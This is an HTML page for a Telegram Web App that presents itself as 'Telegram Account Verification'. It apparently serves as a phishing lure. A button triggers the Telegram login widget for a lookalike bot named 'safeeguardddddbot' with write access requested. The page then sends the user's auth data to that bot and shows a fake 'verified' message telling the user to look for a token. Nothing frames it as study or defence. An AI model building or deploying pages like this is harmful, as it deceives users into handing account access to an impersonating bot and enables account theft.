<!DOCTYPE html>
<html>
<head>
    <title>Telegram Login Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            overscroll-behavior: none;
        }
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            background-color: #000000;
            color: #ffffff;
        }
        .button {
            background-color: #0088cc;
            color: white;
            padding: 15px 25px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
        }
        #confirmation {
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div id="login-section">
        <h2>üîê Telegram Account Verification</h2>
        <button class="button" onclick="initiateLogin()">CLICK TO VERIFY</button>
    </div>
    
    <div id="confirmation">
        <h3>Verified successfully, my boy! ‚úÖ</h3>
        <p>Your account has been linked. Check your main Telegram account for the token.</p>
    </div>

    <script async src="https://telegram.org/js/telegram-widget.js?21" 
            data-telegram-login="safeeguardddddbot"
            data-size="large" 
            data-onauth="onTelegramAuth(user)" 
            data-request-access="write"></script>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.enableClosingConfirmation();

        function onTelegramAuth(user) {
            document.getElementById('login-section').style.display = 'none';
            document.getElementById('confirmation').style.display = 'block';
            tg.sendData(JSON.stringify({
                type: 'auth_data',
                user: user
            }));
        }

        function initiateLogin() {
            document.querySelector('script[data-telegram-login]').dispatchEvent(new Event('click'));
        }
    </script>
</body>
</html>
